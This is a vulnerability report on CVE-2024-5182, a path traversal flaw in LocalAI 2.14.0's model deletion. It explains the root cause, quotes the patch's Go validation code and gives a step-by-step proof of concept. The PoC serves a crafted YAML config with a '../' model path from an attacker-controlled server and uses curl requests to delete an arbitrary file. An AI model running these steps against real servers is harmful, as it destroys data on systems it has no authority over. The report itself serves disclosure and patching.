"# CVE-2024-5182 Detailed Report\n\n## 1. Summary of the CVE\nCVE-2024-5182 is a path traversal vulnerability identified in the `mudler/localai` software, specifically affecting version 2.14.0. The vulnerability arises from improper validation of the `model` parameter during the model deletion process. An attacker can exploit this vulnerability by crafting a request with a manipulated `model` parameter, allowing them to traverse the directory structure and delete arbitrary files outside the intended directory. This can lead to the deletion of sensitive data, posing a significant risk to the integrity and availability of the system.\n\n### Vulnerability Type\n- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n\n### Affected Version\n- **Version**: 2.14.0\n\n## 2. Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the insufficient input validation and sanitization of the `model` parameter. The application does not adequately check the contents of the `model` parameter, allowing an attacker to use directory traversal sequences (e.g., `../../`) to navigate outside the intended directory structure.\n\n### Code Analysis\nThe vulnerability can be traced back to the handling of the `model` parameter in the model deletion process. The code responsible for processing this parameter does not enforce strict checks to prevent directory traversal. \n\nThe patch introduced in version 2.16.0 includes a validation function that checks for invalid characters and patterns in the `model` parameter. The following code snippet from the patch illustrates the validation logic:\n\n```go\nfunc (c *BackendConfig) Validate() bool {\n    // Simple validation to make sure the model can be correctly loaded\n    for _, n := range []string{c.Backend, c.Model} {\n        if strings.HasPrefix(n, string(os.PathSeparator)) ||\n            strings.Contains(n, \"..\") {\n            return false\n        }\n    }\n    ...\n}\n```\n\nThis function checks if the `model` parameter starts with a path separator or contains `..`, which are indicators of a potential path traversal attack. If any of these conditions are met, the validation fails, preventing the deletion of files outside the intended directory.\n\n## 3. Exploitation Details\nThe security advisory provides a proof of concept (PoC) demonstrating how to exploit the vulnerability. Below are the necessary steps to exploit CVE-2024-5182:\n\n### Steps to Exploit\n1. **Create a Target File**: Create a file named `deleteme.txt` in the `/tmp` directory.\n   ```bash\n   touch /tmp/deleteme.txt\n   ```\n\n2. **Prepare the Configuration File**: Save the following YAML configuration as `config.yaml`:\n   ```yaml\n   name: \"delete_test\"\n   parameters:\n     model: ../../../../../../../../tmp/deleteme.txt\n   ```\n\n3. **Start a Local HTTP Server**: Start a Python HTTP server to serve the `config.yaml` file.\n   ```bash\n   python3 -m http.server\n   ```\n\n4. **Add the Model**: Use `curl` to send a POST request to add the model, replacing `<exploit_server>` with the address of your server.\n   ```bash\n   curl http://localhost:8080/models/apply -X POST -H \"Content-Type: application/json\" -d '{\"config_url\":\"<exploit_server>/config.yaml\",\"id\":\"\"}'\n   ```\n\n5. **Calculate the Model Name**: The model name is the MD5 hash of the `config_url`. Use the following command to calculate it:\n   ```bash\n   echo -n \"<exploit_server>/config.yaml\" | md5sum\n   ```\n\n6. **Delete the Model**: Use `curl` to send a POST request to delete the model using the calculated MD5 hash.\n   ```bash\n   curl http://localhost:8080/models/delete/<calculated_md5_hash> -X POST\n   ```\n\n7. **Verify Deletion**: After the deletion process is completed, check the `/tmp` directory to confirm that `deleteme.txt` has been deleted.\n\n### Impact\nExploiting this vulnerability allows an attacker to delete arbitrary files on the server, which can lead to the loss of sensitive data and potentially disrupt the operation of the application. The attack complexity is low, and no privileges or user interaction are required, making it a significant security concern.\n\n## Conclusion\nCVE-2024-5182 represents a critical path traversal vulnerability in the `mudler/localai` software that can be exploited to delete arbitrary files. The root cause is insufficient validation of the `model` parameter, which has been addressed in the subsequent patch. Users of affected versions are strongly advised to upgrade to version 2.16.0 or later to mitigate this vulnerability."